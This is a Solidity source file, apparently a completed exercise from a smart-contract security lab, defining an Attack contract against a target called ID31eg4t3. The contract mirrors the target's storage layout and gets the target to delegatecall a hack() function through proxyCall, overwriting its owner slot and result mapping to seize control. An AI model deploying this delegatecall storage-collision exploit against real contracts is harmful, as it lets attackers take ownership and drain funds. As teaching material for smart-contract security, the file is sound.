// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    // TODO: Declare some variable here
    // Note: Checkout the storage layout in victim contract
    uint256 private slot1;
    uint256 private slot2;
    uint256 private slot3;
    uint256 private slot4;
    address private owner;
    mapping(address => bool) private result;

    constructor(address addr) payable {
        victim = addr;
    }

    // NOTE: You might need some malicious function here

    function exploit() external {
        // TODO: Add your implementation here
        // Note: Make sure you know how delegatecall works
        // bytes memory data = ...
        bytes memory data = abi.encodeWithSignature("hack(address)", msg.sender);
        ID31eg4t3(victim).proxyCall(data);
    }

    function hack(address addr) external {
        owner = addr;
        result[addr] = true;
    }
}
